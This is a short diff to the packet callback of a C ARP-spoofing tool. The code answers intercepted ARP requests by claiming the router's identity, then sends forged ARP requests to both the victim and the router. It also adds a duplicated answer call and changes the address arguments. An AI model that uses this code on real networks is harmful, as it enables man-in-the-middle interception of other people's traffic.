@@ -151,10 +151,11 @@ void got_packet(u_char *args, const struct pcap_pkthdr *header, const u_char *pa
 			printf("\t\t[Intercepted ARP request for the Router] we gotta answer !\n\n");
 			// we answer our mac addr to the victim, we tell him we are the router
 			arp_answer(eth_pack.eth_src, arp_payload.ar_spa, arp_payload.ar_tpa);
+			arp_answer(eth_pack.eth_src, arp_payload.ar_spa, arp_payload.ar_tpa);
 			// we ask the victim what is it's mac addr, saying we are the router
-			arp_request(eth_pack.eth_src, my_mac_addr, my_mac_addr, (uint8_t *)&router_ip_addr, null_addr, arp_payload.ar_spa);
+			arp_request(eth_pack.eth_src, my_mac_addr, my_mac_addr, ntohl(router_ip_addr), null_addr, *(uint32_t *)arp_payload.ar_spa);
 			// we ask the router his mac addr, saying we are the victim
-			arp_request(router_mac_addr, my_mac_addr, my_mac_addr, arp_payload.ar_spa, null_addr, (uint8_t *)&router_ip_addr);
+			arp_request(router_mac_addr, my_mac_addr, my_mac_addr, *(uint32_t *)arp_payload.ar_spa, null_addr, ntohl(router_ip_addr));
 
 		}
 	} else if (type == ETH_TYPE_IP) {
